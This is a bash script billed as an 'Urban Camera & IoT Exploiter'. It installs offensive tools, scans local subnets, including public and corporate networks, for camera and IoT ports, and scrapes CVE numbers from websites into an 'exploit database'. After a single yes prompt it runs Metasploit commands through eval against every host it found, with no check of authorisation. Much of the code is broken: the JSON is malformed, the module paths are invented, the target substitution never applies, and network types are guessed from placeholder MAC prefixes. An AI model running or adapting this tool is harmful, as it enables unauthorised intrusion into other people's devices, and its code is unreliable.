#!/bin/bash
# Urban Camera & IoT Scanner & Exploit Executor
# Supports Linux/macOS | Detects Networks | Builds & Updates Exploit DB | Runs Exploits Safely

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

EXPLOIT_DB="exploits_db.json"
EXPLOIT_SOURCES=("https://www.exploit-db.com" "https://nvd.nist.gov/" "https://github.com/search?q=CVE" "https://www.metasploit.com/modules")

echo -e "${CYAN}🚀 Urban Camera & IoT Exploiter - Multi-Network Scanner & Access Tool${NC}"

# Detect OS
OS=$(uname -s)
if [[ "$OS" == "Darwin" ]]; then
    SYSTEM="macOS"
    PKG_MANAGER="brew"
elif [[ "$OS" == "Linux" ]]; then
    SYSTEM="Linux"
    PKG_MANAGER="apt-get"
else
    echo -e "${RED}❌ Unsupported system. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Running on $SYSTEM${NC}"

# Function to install dependencies
install_dependencies() {
# Check if brew is installed, if not install it
if ! command -v brew &>/dev/null; then
    echo -e "${YELLOW}⚠️ Homebrew not found! Installing Homebrew...${NC}"
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    export PATH="/opt/homebrew/bin:$PATH"  # Ensure brew is in path for Apple Silicon Macs
fi

# Now proceed with dependency installation
echo -e "${YELLOW}🔄 Installing missing dependencies...${NC}"
DEPS=("nmap" "arp-scan" "hcitool" "tcpdump" "aircrack-ng" "iwlist" "masscan" "bettercap" "hydra" "metasploit-framework")

for dep in "${DEPS[@]}"; do
    if ! command -v $dep &>/dev/null; then
        echo -e "${CYAN}📦 Installing: $dep${NC}"
        brew install $dep
    else
        echo -e "${GREEN}✅ $dep is already installed${NC}"
    fi
done
}

install_dependencies

# Function to get active network interfaces
get_interfaces() {
    if [[ "$SYSTEM" == "Linux" ]]; then
        ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
    elif [[ "$SYSTEM" == "macOS" ]]; then
        networksetup -listallhardwareports | awk '/Device/ {print $2}'
    fi
}

# Function to check and enable network interfaces
enable_interfaces() {
    for iface in $(get_interfaces); do
        status=$(ip link show "$iface" | grep -o "UP")
        if [[ -z "$status" ]]; then
            echo -e "${YELLOW}🛑 Interface $iface is disabled. Enable? (yes/no)${NC}"
            read -r enable_choice
            if [[ "$enable_choice" == "yes" ]]; then
                sudo ip link set "$iface" up
                echo -e "${GREEN}✅ $iface enabled.${NC}"
            else
                echo -e "${CYAN}⚠️ Skipping $iface.${NC}"
            fi
        fi
    done
}

enable_interfaces

# Function to classify local network environment
classify_environment() {
    echo -e "${CYAN}🔍 Detecting local network environment...${NC}"
    gateway_mac=$(ip route | grep default | awk '{print $3}' | xargs arp -n | awk '{print $3}')
    
    if [[ "$gateway_mac" =~ ^(00:1A:2B|DC:A6:32) ]]; then
        echo -e "${GREEN}🏠 Home Network Detected${NC}"
    elif [[ "$gateway_mac" =~ ^(00:50:56|F8:35:DD) ]]; then
        echo -e "${YELLOW}🏢 Corporate Network Detected${NC}"
    elif [[ "$gateway_mac" =~ ^(AA:BB:CC|DD:EE:FF) ]]; then
        echo -e "${RED}📶 Public Wi-Fi Detected${NC}"
    else
        echo -e "${CYAN}⚙️ Industrial IoT Network Detected${NC}"
    fi
}

classify_environment

# Function to scan network
scan_network() {
    local iface=$1
    if [[ "$SYSTEM" == "Linux" ]]; then
        local subnet=$(ip -4 addr show "$iface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+')
    elif [[ "$SYSTEM" == "macOS" ]]; then
        local subnet=$(ifconfig "$iface" | grep 'inet ' | awk '{print $2}' | head -n 1)
    fi


    if [ -z "$subnet" ]; then
        echo -e "${YELLOW}⚠️ No active IP found on $iface, skipping...${NC}"
        return
    fi

    echo -e "${GREEN}📡 Scanning subnet: $subnet on $iface${NC}"
    sudo nmap -sS -p 22,23,80,443,554,8080,37777,8000-9000,161 --open -T4 "$subnet" -oG - | grep "Up" | awk '{print $2}'
}

# Function to update exploit database
update_exploit_db() {
    echo -e "${CYAN}🔄 Updating Exploit Database...${NC}"
    
    echo '{ "exploits": [] }' > "$EXPLOIT_DB"

    for src in "${EXPLOIT_SOURCES[@]}"; do
        echo -e "${YELLOW}📡 Fetching exploits from: $src...${NC}"
        curl -s "$src" | grep -oP "CVE-[0-9]{4}-[0-9]{4,}" | while read -r CVE; do
            echo -e "${GREEN}💣 Found Exploit: $CVE${NC}"
            echo "{ \"name\": \"$CVE\", \"target\": \"Unknown\", \"command\": \"msfconsole -q -x 'search $CVE; use exploit/$CVE; run'\" }," >> "$EXPLOIT_DB"
        done
    done

    sed -i '$ s/.$//' "$EXPLOIT_DB"
    echo "]}" >> "$EXPLOIT_DB"

    echo -e "${GREEN}✅ Exploit database updated!${NC}"
}

# Function to execute exploits
execute_exploits() {
    echo -e "${YELLOW}🛑 WARNING: Do you want to attempt exploitation on detected devices? (yes/no)${NC}"
    read -r user_input

    if [[ "$user_input" == "yes" ]]; then
        echo -e "${RED}💥 Proceeding with exploitation attempts...${NC}"
        while IFS= read -r ip; do
            echo -e "${CYAN}🔹 Targeting: $ip${NC}"
            for exploit in $(jq -c '.exploits[]' "$EXPLOIT_DB"); do
                CMD=$(echo "$exploit" | jq -r '.command' | sed "s/TARGET_IP/$ip/g")
                echo -e "${GREEN}💣 Running: $CMD${NC}"
                eval "$CMD"
            done
        done < detected_devices.txt
    else
        echo -e "${CYAN}✅ Scan completed. No exploits executed.${NC}"
    fi
}

# User menu
while true; do
    echo -e "${CYAN}🚀 Urban Scanner - Main Menu${NC}"
    echo "1) Scan Networks for Cameras & IoT"
    echo "2) Update Exploit Database"
    echo "3) Run Exploits on Detected Devices"
    echo "4) Exit"
    read -p "Choose an option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}🔍 Scanning for devices...${NC}"
            for iface in $(get_interfaces); do
                scan_network "$iface"
            done > detected_devices.txt
            ;;
        2)
            update_exploit_db
            ;;
        3)
            execute_exploits
            ;;
        4)
            echo -e "${CYAN}🚀 Exiting...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}❌ Invalid choice!${NC}"
            ;;
    esac
done
